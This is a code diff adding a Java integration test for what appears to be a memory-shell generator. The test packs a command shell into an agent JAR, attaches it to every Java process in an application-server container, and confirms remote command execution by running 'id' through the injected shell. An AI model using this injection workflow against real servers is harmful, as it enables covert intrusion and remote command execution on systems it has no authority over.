@@ -503,4 +503,52 @@ public class ShellAssertion {
                 containsString("servletNameTestFilter -> ServletNameTestFilter -> Servlet:[b64, biginteger]")
         ));
     }
+
+    @SneakyThrows
+    public static void testListProcessAndAttachAll(String url, ContainerTestConfig config, String shellType, GenericContainer<?> appContainer) {
+        String shellTool = ShellTool.Command;
+        Packers packer = Packers.AgentJarWithJREAttacher;
+        Pair<String, String> urls = getUrls(url, shellType, shellTool, packer);
+        String shellUrl = urls.getLeft();
+        String urlPattern = urls.getRight();
+
+        ShellToolConfig shellToolConfig = getShellToolConfig(shellType, shellTool, packer);
+        MemShellResult generateResult = generate(urlPattern, config.getServer(), config.getServerVersion(),
+                shellType, shellTool, config.getTargetJdkVersion(), shellToolConfig, packer);
+
+        // Pack and copy to container
+        byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+        Path tempJar = Files.createTempFile("temp", "jar");
+        Files.write(tempJar, bytes);
+        String jarPath = "/listProcessTest.jar";
+        appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
+        FileUtils.deleteQuietly(tempJar.toFile());
+
+        // Test 1: List processes (no args)
+        Container.ExecResult listResult = appContainer.execInContainer("java", "-jar", jarPath);
+        String listStdout = listResult.getStdout();
+        if (listStdout.contains("executable file not found")) {
+            listResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath);
+            listStdout = listResult.getStdout();
+        }
+        log.info("list processes output:\n{}", listStdout);
+        System.out.println("list stderr: " + listResult.getStderr());
+        assertThat("Should find at least one Java process", listStdout.trim(), not(equalTo("")));
+        assertThat("Should find Java processes", listStdout, not(containsString("No Java processes found")));
+
+        // Test 2: Attach all
+        Container.ExecResult attachResult = appContainer.execInContainer("java", "-jar", jarPath, "all");
+        String attachStdout = attachResult.getStdout();
+        if (attachStdout.contains("executable file not found")) {
+            attachResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath, "all");
+            attachStdout = attachResult.getStdout();
+        }
+        log.info("attach all output:\n{}", attachStdout);
+        System.out.println("attach all stderr: " + attachResult.getStderr());
+        assertThat("Attach all should complete with ok", attachStdout, containsString("ok"));
+
+        // Test 3: Verify shell injection was successful
+        String paramName = ((CommandConfig) shellToolConfig).getParamName();
+        commandIsOk(shellUrl, shellType, paramName, "id");
+    }
 }
